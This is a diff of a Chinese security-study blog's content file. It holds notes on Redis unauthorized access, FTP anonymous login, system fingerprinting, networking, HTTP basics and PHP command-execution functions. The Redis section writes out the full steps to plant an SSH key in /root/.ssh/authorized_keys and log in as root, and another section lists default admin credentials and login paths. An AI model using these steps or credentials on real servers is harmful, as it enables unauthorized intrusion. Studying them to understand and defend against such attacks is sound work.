+<p>硬编码旁路凭证漏洞””</p>
+<p>在系统中找到一个硬编码的认证字符，通过该字符绕过复杂的认证逻辑。</p>
+<h4 id="FTP匿名访问漏洞"><a href="#FTP匿名访问漏洞" class="headerlink" title="FTP匿名访问漏洞"></a>FTP匿名访问漏洞</h4><p>FTP匿名登录是指开启了FTP的用户设置了匿名登录功能。</p>
+<h4 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h4><ul>
+<li>Redis默认情况下，会绑定在6379端口，这样会将Redis服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。</li>
+<li>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功在Redis服务器 上写入公钥，进而可以使用对应私钥直接登录目标服务器。</li>
+</ul>
+<p>Redis基本命令参考</p>
+<ul>
+<li>config set: 可以动态的调整Redis服务器的配置(configuration)而无须重启。</li>
+<li>config get: 用于取得运行中的Redis服务器的配置参数(configuration parameters)。</li>
+</ul>
+<p>本地生成公钥私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
 
-<h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了六种请求方法：OPTIONS, PUT, PATCH, DELETE, TRACE 和 CONNECT 方法。</p>
+<p>公钥写入 foo.txt文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;;cat id_ras.pub;echo -e &quot;\n\n&quot;)&gt;foo.txt</span><br></pre></td></tr></table></figure>
+
+<p>连接Redis写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat foo.txt l redis-cli -h 192.168.1.11 -x set crackit</span><br><span class="line">redis-cli -h 192.168.1.11</span><br><span class="line">192.168.1.11:6379&gt;config set dir /root/.ssh/</span><br><span class="line">192.168.1.11:6379&gt;config get dir</span><br><span class="line">192.168.1.11;6379&gt;config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">192.168.1.11;6379&gt;save</span><br></pre></td></tr></table></figure>
+
+<p>本地使用私钥免密登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure>
+
+<h3 id="Github-泄露"><a href="#Github-泄露" class="headerlink" title="Github 泄露"></a>Github 泄露</h3><ul>
+<li>ssh password</li>
+<li>mysql password</li>
+<li>mail password</li>
+<li>resume(简历)</li>
+<li>WXApi registerApp(api注册接口)</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>系统类型及版本识别</title>
+    <url>/2022/02/26/%E6%9D%82%E9%A1%B9/tw0/%E9%80%9A%E7%94%A8%E6%80%A7%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB/</url>
+    <content><![CDATA[<p>1.web目录文件扫描工具</p>
+<p>eg: 御剑、DirBuster、Dirsearch、cansina。</p>
+<p>2.robots.txt文件</p>
+<p>3.请求头数据包里的信息</p>
+<p>eg: </p>
+<ul>
+<li><p>(1) http响应报头的X-Powered-By字段来识别</p>
+</li>
+<li><p>(2) header中的Server信息</p>
+</li>
+<li><p>(3) Cookies中的信息</p>
+</li>
+</ul>
+<p>4.源文件</p>
+<p>网页源码(网页中-&gt;鼠标右键-&gt;查看网页源码)中的注释或者相关函数命名等。</p>
+<p>5.正常页面或报错信息关键字</p>
+<ul>
+<li><p>网页正常显示可能会存在相关系统类型和版本的标识</p>
+</li>
+<li><p>报错信息(构造报错界面)中也可能会存在相关信息</p>
+</li>
+</ul>
+<p>6.nmap进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namp -sV --version-intensity 0 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p>7.计算机网站的相关静态资源的md5值。</p>
+<p>8.指纹识别工具</p>
+<hr>
+<p>默认配置:</p>
+<ul>
+<li>phpcms默认口令: phpcms/phpcms</li>
+<li>tomcat: admin/admin、tomcat/tomcat</li>
+<li>weblogic: weblogic/weblogic</li>
+</ul>
+<p>数据库默认前缀:</p>
+<ul>
+<li>v9版本: v9_</li>
+<li>v9以前版本: phpcms_</li>
+</ul>
+<p>后台默认地址: </p>
+<p><a href="http://url/admin/index(login).php(asp)">http://url/admin/index(login).php(asp)</a></p>
+<p><a href="http://url/manage.php/index(login).php(asp)">http://url/manage.php/index(login).php(asp)</a></p>
+<p><a href="http://url/member.php/index(login).php(asp)">http://url/member.php/index(login).php(asp)</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>网络设备基础</title>
+    <url>/2022/03/12/%E6%9D%82%E9%A1%B9/tw0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="网络设备简介"><a href="#网络设备简介" class="headerlink" title="网络设备简介"></a>网络设备简介</h2><h3 id="网络设备是什么"><a href="#网络设备是什么" class="headerlink" title="网络设备是什么"></a>网络设备是什么</h3><p>网络设备即连接到网络的物理实体。</p>
+<h3 id="常见的网络设备"><a href="#常见的网络设备" class="headerlink" title="常见的网络设备"></a>常见的网络设备</h3><p>网卡(<code>Network Interface</code>)</p>
+<ul>
+<li>计算机连接网络的设备。</li>
+</ul>
+<p>网桥(<code>Bridge</code>)</p>
+<ul>
+<li>工作在数据连路层。</li>
+<li>具有协议转换功能，能在两个不同网络协议的设备间进行通信。</li>
+<li>一种对帧进行转发的技术，根据<code>MAC</code>分区块，可隔离碰撞。</li>
+<li>网桥也可以说相当一个端口少的二层交换机，主要由软件实现。</li>
+<li>今天的操作系统之间为了互相交流，支持更多的协议，操作系统自己就可以是网桥，现在网桥这个概念已经淡出了。更多是所谓的桥接、转发、协议二次封装。 </li>
+</ul>
+<p>中继器(RP Repeater)</p>
+<ul>
+<li>工作在物理层。</li>
+<li>一般两个端口，多端口称为集线器(Hub)。</li>
+<li>适用于完全相同的两类网络的互连，主要功能是通过对数据信号的重新发送或者转发，来扩大网络传输的距离。</li>
+</ul>
+<p>交换机(Switch)</p>
+<ul>
+<li>全双工。</li>
+<li>同时使集线器和网桥的升级换代产品(更加智能)。</li>
+<li>4-7层交换机可用于带宽控制、特殊应用访问加速、防火墙等。</li>
+</ul>
+<p>路由器(Router)</p>
+<ul>
+<li>工作在网络层。</li>
+<li>可以连接任意两个数据链路。</li>
+</ul>
+<p>网关(Gateway)</p>
+<ul>
+<li><p>在网络层以上实现网络互连，仅用于两个高层协议不同的网络互连。</p>
+</li>
+<li><p>负责协议转换和数据转发。</p>
+</li>
+</ul>
+<h3 id="常见术语"><a href="#常见术语" class="headerlink" title="常见术语"></a>常见术语</h3><p>数据流传输模式</p>
+<ul>
+<li>单工:单向传输，一方固定发送，一方固定接收。</li>
+<li>半双工:双向传输，同一时间只能一方发送一方接收。</li>
+<li>全双工:双向传输，可以同时互相发送数据接收数据。</li>
+</ul>
+<p>数据流传输速率: 网速(<code>10M/100M/1G</code>)等。</p>
+<h2 id="交换机简介"><a href="#交换机简介" class="headerlink" title="交换机简介"></a>交换机简介</h2><h3 id="MAC地址简介"><a href="#MAC地址简介" class="headerlink" title="MAC地址简介"></a><code>MAC</code>地址简介</h3><p>定义:<code>MAC</code>地址(<code>Media Access Control Address</code>)直译为媒体访问控制地址，也称为局域网地址(<code>LAN Address</code>)，以太网地址(<code>Ethernet Address</code>)或物理地址(<code>Physical Address</code>)，它是一共用来确认网上设备位置的地址。在<code>OSI</code>模型中，第三层网络负责<code>IP</code>地址，第二层数据链路层负责<code>MAC</code>地址。</p>
+<p>注:</p>
+<ul>
+<li>长<code>48bit</code>。</li>
+<li>全球唯一性。</li>
+<li>获取方法: <code>Windows :ipconfig /all</code> ； <code>Linux: ifconfig</code>。</li>
+</ul>
+<h3 id="数据帧简介"><a href="#数据帧简介" class="headerlink" title="数据帧简介"></a>数据帧简介</h3><p>数据帧的格式</p>
 <table>
+<thead>
+<tr>
+<th>前导字符</th>
+<th>目的MAC地址</th>
+<th>源MAC地址</th>
+<th>类型</th>
+<th>IP头部</th>
+<th>TCP头部</th>
+<th>数据</th>
+<th>帧校验</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>数据帧的传播方式</p>
+<ul>
+<li>单播: 一对一的发送。</li>
+<li>组播: 主机侦听特定组播地址，接受并处理目的<code>MAC</code>地址为该改组播<code>MAC</code>地址的帧。</li>
+<li>广播: 从单一的源发送到共享以太网上的所有主机。</li>
+</ul>
+<p>组播<code>MAC</code>地址和单播<code>MAC</code>的区分: 组播<code>MAC</code>地址是通过<code>MAC</code>地址第一字节中的第8个比特区分的。组播<code>MAC</code>地址的第8个比特为1，而单播<code>MAC</code>地址的第8个比特为0.</p>
+<h3 id="交换原理"><a href="#交换原理" class="headerlink" title="交换原理"></a>交换原理</h3><p>关键的三张表</p>
+<p><code>MAC</code>地址表: 记录<code>MAC</code>地址及学习该<code>MAC</code>地址的端口，<code>MAC</code>地址可以是静态获得(手动配置，永不失效)，也可以动态获得(自学习)。</p>
+<table>
+<thead>
+<tr>
+<th>VLAN</th>
+<th>MAC</th>
+<th>端口</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>….</td>
+<td>….</td>
+<td>….</td>
+<td>….</td>
+</tr>
+</tbody></table>
+<p><code>VLAN</code>表: 记录哪些端口属于某个<code>VLAN</code>，一个端口可以属于多个<code>VLAN</code>。</p>
+<table>
+<thead>
+<tr>
+<th>VLAN</th>
+<th>端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>….</td>
+<td>….</td>
+</tr>
+</tbody></table>
+<p>端口寄存表: 记录了该端口的缺省<code>VLAN</code>。</p>
+<p>缺省<code>VLAN</code>的作用: 当接口接受到不带<code>VLAN</code>标记的报文后，将报文转发到属于缺省<code>VLAN</code>的端口。</p>
+<table>
+<thead>
+<tr>
+<th>pvid</th>
+<th>端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>….</td>
+<td>….</td>
+</tr>
+</tbody></table>
+<p>交换机工作原理</p>
+<ol>
+<li>源<code>MAC</code>地址学习: 当交换机从某个端口收到一个数据包，它先读取包头中的源<code>MAC</code>地址，并将该地址及端口记录到<code>MAC</code>地址表中。</li>
+<li>查询<code>MAC</code>地址表: 再去读取包头中的目的<code>MAC</code>地址，并在地址表中查找相应的端口。</li>
+<li>丢弃、转发、泛洪: 丢弃: 目标端口为本端口；转发: 目标端口为已知端口；泛洪: 目标端口为未知端口。</li>
+</ol>
+<h3 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h3><p>定义: <code>VLAN</code>(<code>Virtual Local Area Network</code>)即虚拟局域网，是将一个物理的<code>LAN</code>在逻辑上划分成为多个广播域的通信技术。</p>
+<p>作用: 限制广播域、增强安全性、提高网络健壮性、灵活构建虚拟工作组。</p>
+<p>取值范围: 0-4095,0和4095为协议保留取值，<code>VLAN ID</code>的有效取值范围是1~4094。</p>
+<p>常用设备接受的帧类型: 用户主机、服务器、<code>Hub</code>只能收发<code>Untagged</code>帧。交换机、路由器和<code>AC</code>既能收发<code>Tagged</code>帧，也能收发<code>Untagged</code>帧。语音终端、<code>AP</code>等设备可以同时收发一个<code>Tagged</code>帧和一个<code>Untagged</code>帧。</p>
+<h3 id="交换机接口类型"><a href="#交换机接口类型" class="headerlink" title="交换机接口类型:"></a>交换机接口类型:</h3><ul>
+<li><code>Access</code>:一般用于连接计算机。</li>
+<li><code>Trunk</code>:计算机之间的集连。</li>
+<li><code>Hybrid</code>:混合型。</li>
+</ul>
+<h2 id="路由器简介"><a href="#路由器简介" class="headerlink" title="路由器简介"></a>路由器简介</h2><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a><code>IP</code>地址</h3><p><code>ip</code>地址是指互联网协议地址(<code>Internet Protocol Address</code>，又译为网际协议地址)，是<code>IP Address</code> 的缩写。<code>IP</code>地址为逻辑地址，以此来屏蔽物理地址的差异。</p>
+<p>版本:</p>
+<ul>
+<li><code>ipv4</code>: <code>32bit</code>。通常用点分十进制表示，如’<code>192.168.1.1</code>‘。</li>
+<li><code>ipv6</code>: <code>128bit</code>。通常用十六进制表示，如’<code>AABB:1231:4564:7897:FECB:1231:4664:7897</code>‘。</li>
+</ul>
+<p><code>ipv4</code>分类:</p>
+<ul>
+<li>A类: 0.0.0.0-127.255.255.255</li>
+<li>B类: 128.0.0.0-192.255.255.255</li>
+<li>C类: 192.0.0.0-223.255.255.255</li>
+</ul>
+<p><code>IP</code>地址类型:</p>
+<ul>
+<li>公网地址: 可以直接访问因特网。</li>
+<li>私网地址: 不可直接访问因特网。有三种10.0.0.0-10.255.255.255/172.16.0.0-172.31.255.255.255/192.168.0.0-192.168.255.255</li>
+</ul>
+<h3 id="路由原理"><a href="#路由原理" class="headerlink" title="路由原理"></a>路由原理</h3><p>路由: 路由(<code>Routing</code>)工作在网络层，通过转发分组实现网络互连，并连接两个<code>IP</code>子网。指分组从源到目的地时，决定端到端路径的网络范围的进程。</p>
+<ul>
+<li>最佳路径。</li>
+<li>通过网络传输信息。</li>
+</ul>
+<p>路由表: 路由表中含有网络周边的拓扑信息。路由表建立的主要目标是为了实现路由协议和静态路由选择。</p>
+<p>表项:</p>
+<table>
+<thead>
+<tr>
+<th>目的地址</th>
+<th>网络掩码</th>
+<th>pre</th>
+<th>cost</th>
+<th>输出接口</th>
+<th>下一跳</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>….</td>
+<td>….</td>
+<td>….</td>
+<td>….</td>
+<td>….</td>
+<td>….</td>
+</tr>
+</tbody></table>
+<p>路由表的来源:</p>
+<ul>
+<li>连路程协议发现(直连路由)。</li>
+<li>手动配置(静态路由)。</li>
+<li>自学习(动态路由)。</li>
+</ul>
+<p>工作原理: </p>
+<ol>
+<li>路由器接受到数据包，提取目标<code>ip</code>地址及子网掩码计算目标网络地址。</li>
+<li>根据目标网络地址找查路由表，如果找到目标网络地址就按照相应的出口发送给下一个路由器。</li>
+<li>如果没有找到，就看一下有没有默认路由，如果有就按照默认路由的出口发送给下一个路由器。</li>
+<li>如果没有找到就给源<code>ip</code>发送一个出错<code>ICMP</code>数据包表明没法传递该数据包。</li>
+<li>如果是连接路由就按照第二层<code>MAC</code>地址发送给目标站点。</li>
+</ol>
+<h3 id="路由分类"><a href="#路由分类" class="headerlink" title="路由分类"></a>路由分类</h3><p>路由协议:</p>
+<p><code>IGP</code>(内部网关路由协议):又分为动态路由协议和静态路由协议。</p>
+<p>动态路由协议分为: 距离矢量路由协议、链路状态路由协议。</p>
+<p>距离又分为: <code>RIP1</code>、<code>IGRP</code>。链路分为: <code>OSPF</code>、<code>IS-IS</code>。</p>
+<p><code>EGP</code>(外部网关路由协议):<code>EGP</code>、<code>BGP</code>。</p>
+<h3 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h3><ul>
+<li>子网掩码: 不能单独存在，它必须结合<code>IP</code>地址一起使用。子网掩码只有一个作用，就是将某个<code>IP</code>地址划分成网络地址和主机地址两部分。</li>
+<li>有类路由: 只会传送网络前缀(网络地址)，但是不会包含子网掩码,<code>RIPv1</code>、<code>IGRP</code>、<code>EGP</code>。</li>
+<li>无类路由: 传输网络前缀(网络地址)的同时也会传输子网掩码，所以它支持<code>VLSM</code>、<code>ROPv2</code>、<code>EIGRP</code>、<code>OSPF</code>、<code>IS-IS</code>、<code>BGP</code>。</li>
+<li>自治系统(<code>AS</code>): 一个自治系统是一个有权自主决定在本系统中应采用何种路由协议的小型单位。自治系统之间的链接使用外部路由协议，如<code>BGP</code>。</li>
+<li>默认路由(缺省路由): 一种特殊的静态路由，指的是当路由表中与包的目的地址之间没有匹配的表项时路由器能够做出的选择。</li>
+<li>网关: 一个网络连接到另一个网络的”关口”。</li>
+</ul>
+<h2 id="安全设备介绍"><a href="#安全设备介绍" class="headerlink" title="安全设备介绍"></a>安全设备介绍</h2><ul>
+<li>防护类: 防火墙、入侵防护设备、抗<code>DDOS</code>设备、<code>Waf</code>设备。</li>
+<li>监测类: 入侵监测、审计设备。</li>
+<li>评估类: 扫描器。</li>
+<li>其他: 平台设备。</li>
+</ul>
+<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>防火墙（<code>Firewall</code>）技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。</p>
+<p>参考文章: </p>
+<p><a href="https://www.cnblogs.com/Chuck-Yue/p/10395644.html">https://www.cnblogs.com/Chuck-Yue/p/10395644.html</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>网络协议基础</title>
+    <url>/2022/03/12/%E6%9D%82%E9%A1%B9/tw0/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h2><h3 id="HTTP协议的定义"><a href="#HTTP协议的定义" class="headerlink" title="HTTP协议的定义"></a><code>HTTP</code>协议的定义</h3><ul>
+<li><code>HTTP</code>协议是<code>Hyper Text Transfer Protocol</code>(超文本传输协议)的缩写，是用于万维网(<code>WWW:World Wide Web</code>)服务器传输超文本到本地浏览器的传送协议。</li>
+<li><code>HTTP</code>是一个基于<code>TCP/IP</code>通信协议来传递数据(<code>HTML</code>文件，图片文件，查询结果等)。</li>
+</ul>
+<p><code>HTTP</code>协议工作于客户端-服务端架构上(<code>C/S</code>)。浏览器作为<code>HTTP</code>客户端通过<code>URL</code>向<code>HTTP</code>服务端即<code>WEB</code>服务器发送所有请求。<code>Web</code>服务器根据收到的请求，向客户端发送响应信息。</p>
+<p>默认端口80。</p>
+<p><code>HTTPS</code>默认端口443。</p>
+<h3 id="HTTP协议的特点"><a href="#HTTP协议的特点" class="headerlink" title="HTTP协议的特点"></a><code>HTTP</code>协议的特点</h3><ul>
+<li>简单快速: 客户向服务器请求服务时，只需传送请求方法(常用<code>POST</code>,<code>GET</code>,<code>HEAD</code>)和路径。由于<code>HTTP</code>协议简单，使得<code>HTTP</code>服务器的程序规模小，因而通信速度很快。</li>
+<li>灵活: <strong>运行传输任意类型的数据对象，由<code>Content-Type</code>标记。</strong></li>
+<li>无连接: 限制每次连接只处理一个请求。服务器处理完客户的请求，并受到客户的应答后，即断开连接。</li>
+<li>无状态: 协议对于事务处理没有记忆能力。</li>
+</ul>
+<h3 id="HTTP的请求方法"><a href="#HTTP的请求方法" class="headerlink" title="HTTP的请求方法"></a><code>HTTP</code>的请求方法</h3><ul>
+<li><table>
 <thead>
 <tr>
 <th>No.</th>
@@ -235,7 +796,9 @@
 <td>回显服务器收到的请求，主要用于测试或诊断。</td>
 </tr>
 </tbody></table>
-<h2 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h2><p>HTTP状态码（Status-Code）由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：</p>
+</li>
+</ul>
+<h3 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h3><p>HTTP状态码（<code>Status-Code</code>）由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。<code>HTTP</code>状态码共分为5种类型：</p>
 <pre><code>1xx 信息响应类，表示接收到请求并且继续处理
 2xx 处理成功响应类，表示动作被成功接收、理解和接受
 3xx 重定向响应类，为了完成指定的动作，必须接受进一步处理
@@ -251,384 +814,162 @@
 500 Internal Server Error //服务器发生不可预期的错误
 503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 
 </code></pre>
-<p>转载至：<a href="https://blog.csdn.net/woaixiaoyu520/article/details/76690686">https://blog.csdn.net/woaixiaoyu520/article/details/76690686</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>HTTP请求中，几种常见的Content-Type类型</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/HTTP%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%A7%8DContent-Type%E7%B1%BB%E5%9E%8B/</url>
-    <content><![CDATA[<p>POST请求的消息主体放在entity body中，服务端根据请求头中的Content-Type字段来获取消息主体的编码方式，进而进行解析数据。</p>
-<span id="more"></span>
-
-<h2 id="HTTP请求中，几种常见的Content-Type类型"><a href="#HTTP请求中，几种常见的Content-Type类型" class="headerlink" title="HTTP请求中，几种常见的Content-Type类型"></a>HTTP请求中，几种常见的Content-Type类型</h2><p>POST请求的消息主体放在entity body中，服务端根据请求头中的Content-Type字段来获取消息主体的编码方式，进而进行解析数据。</p>
-<h3 id="1-application-x-www-form-urlencoded"><a href="#1-application-x-www-form-urlencoded" class="headerlink" title="1.application/x-www-form-urlencoded"></a>1.application/x-www-form-urlencoded</h3><p>最常见的 POST 提交数据的方式，原生Form表单，如果不设置 enctype 属性，默认为application/x-www-form-urlencoded 方式提交数据。</p>
-<p>首先，Content-Type被指定为  application/x-www-form-urlencoded；其次，提交的表单数据会转换为键值对并按照  key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL  转码。大部分服务端语言都对这种方式有很好的支持。<br>另外，如利用AJAX 提交数据时，也可使用这种方式。例如 jQuery，Content-Type 默认值都是”application/x-www-form-urlencoded;charset=utf-8”。</p>
-<h3 id="2-multipart-form-data"><a href="#2-multipart-form-data" class="headerlink" title="2.multipart/form-data"></a>2.multipart/form-data</h3><p>另一个常见的 POST 数据提交的方式， Form 表单的 enctype  设置为multipart/form-data，它会将表单的数据处理为一条消息，以标签为单元，用分隔符（这就是boundary的作用）分开，类似我们上面Content-Type中的例子。<br>　由于这种方式将数据有很多部分，它既可以上传键值对，也可以上传文件，甚至多个文件。当上传的字段是文件时，会有Content-Type来说明文件类型；Content-disposition，用来说明字段的一些信息。每部分都是以 –boundary  开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（字段、文本或二进制等）。如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。</p>
-<h3 id="3-application-json"><a href="#3-application-json" class="headerlink" title="3.application/json"></a>3.application/json</h3><p>Content-Type: application/json  作为响应头比较常见。实际上，现在越来越多的人把它作为请求头，用来告诉服务端消息主体是序列化后的 JSON 字符串，其中一个好处就是JSON  格式支持比键值对复杂得多的结构化数据。由于 JSON 规范的流行，除了低版本 IE  之外的各大浏览器都原生支持JSON.stringify，服务端语言也都有处理 JSON 的函数，使用起来没有困难。<br>Google 的 AngularJS 中的 Ajax 功能，默认就是提交 JSON 字符串。</p>
-<h3 id="4-text-xml"><a href="#4-text-xml" class="headerlink" title="4.text/xml"></a>4.text/xml</h3><p>XML的作用不言而喻，用于传输和存储数据，它非常适合万维网传输，提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据，在JSON出现之前是业界一大标准（当然现在也是），相比JSON的优缺点大家有兴趣可以上网search。因此，在POST提交数据时，xml类型也是不可缺少的一种，虽然一般场景上使用JSON可能更轻巧、灵活。</p>
-<h3 id="5-binary-application-octet-stream"><a href="#5-binary-application-octet-stream" class="headerlink" title="5.binary (application/octet-stream)"></a>5.binary (application/octet-stream)</h3><p>在Chrome浏览器的Postman工具中，还可以看到”binary“这一类型，指的就是一些二进制文件类型。如application/pdf，指定了特定二进制文件的MIME类型。就像对于text文件类型若没有特定的子类型（subtype），就使用 text/plain。类似的，二进制文件没有特定或已知的 subtype，即使用  application/octet-stream，这是应用程序文件的默认值，一般很少直接使用 。</p>
-<p>对于application/octet-stream，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件，后台接收参数只能有一个，而且只能是流（或者字节数组）。</p>
-<p>很多web服务器使用默认的 application/octet-stream 来发送未知类型。出于一些安全原因，对于这些资源浏览器不允许设置一些自定义默认操作，导致用户必须存储到本地以使用。一般来说，设置正确的MIME类型很重要。</p>
-<p>转载至:<a href="https://blog.csdn.net/woaixiaoyu520/article/details/76690686">https://blog.csdn.net/woaixiaoyu520/article/details/76690686</a> </p>
-]]></content>
-  </entry>
-  <entry>
-    <title>python关于pptx的安装</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/python%E5%85%B3%E4%BA%8Epptx%E7%9A%84%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>首先安装whell</p>
-<p>进入下面这个网址:</p>
-<p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p>
-<span id="more"></span>
-
-<h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>首先安装whell</p>
-<p>进入下面这个网址:</p>
-<p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p>
-<p>下载与自己电脑版本对应的.whl文件(不要该文件名!)</p>
-<p>输入python –version查看python版本,输入systeminfo查看电脑位数:</p>
-<p><img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20210929211919544.png" alt="image-20210929211919544"></p>
-<p>本机python版本为3.9，64位的。</p>
-<p>下载与之对应的版本(保存在哪里都一样):</p>
-<img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20210929212040591.png" alt="image-20210929212040591" style="zoom:67%;" />
-
-<p>进入保存.whl所在的文件夹，执行pip install lxml-4.6.3-cp39-cp39-win_amd64.whl  此处的文件为你所下载的文件名。</p>
-<p>安装成功后，用pip install python-pptx 安装就行了。</p>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p>在Pycharm上安装pptx，打开设置</p>
-<p><img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20211012154552061.png" alt="image-20211012154552061"></p>
-<p>然后进入Projiect里面的interpreter点击加号</p>
-<p><img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20211012154739530.png" alt="image-20211012154739530"></p>
-<p>会出现下面界面，安装图中的包就行了(右下角有install package)</p>
-<img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20211012154854942.png" alt="image-20211012154854942" style="zoom:50%;" />
-
-<p>其实这种方式最终也会用到pip，只是这种是图形化的</p>
-<p>参考连接:<a href="https://www.jianshu.com/p/ecc187c2a46a">https://www.jianshu.com/p/ecc187c2a46a</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>PHP的命令执行函数</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="PHP的命令执行函数"><a href="#PHP的命令执行函数" class="headerlink" title="PHP的命令执行函数"></a>PHP的命令执行函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h1 id="PHP的命令执行函数-1"><a href="#PHP的命令执行函数-1" class="headerlink" title="PHP的命令执行函数"></a>PHP的命令执行函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
-
-<p>1.system() 执行外部程序，并且显示输出，返回最后一行shell结果，如果后面还有参数则将返回值保存在该变量中。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$lase_line</span>=system(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">// 将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回内容保存到 $retval。</span></span><br><span class="line"><span class="comment">//前面是string，后面$retval是int类型。</span></span><br></pre></td></tr></table></figure>
-
-<p>2.passthru() 执行外部程序并且显示原始输出。当所执行的 Unix 命令输出二进制数据，    并且需要直接传送到浏览器的时候，    需要用此函数来替代 exec() 或 system()函数。通过设置 Content-type 为 image/gif，然后调用 pbmplus 程序输出 gif 文件，    就可以从 PHP 脚本中直接输出图像到浏览器，    就可以从 PHP 脚本中直接输出图像到浏览器。</p>
